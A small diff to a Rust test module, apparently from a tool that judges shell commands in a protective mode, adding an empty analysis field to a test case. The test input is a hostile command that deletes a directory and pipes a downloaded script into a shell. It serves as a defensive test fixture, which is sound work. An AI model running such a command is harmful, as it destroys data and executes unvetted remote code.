@@ -245,6 +245,7 @@ mod tests {
             ],
             highlight_ranges: vec![],
             command: Parser::parse("rm -rf target && curl example | sh"),
+            analysis: None,
         };
         let context = DecisionContext::new(
             Mode::Protect,
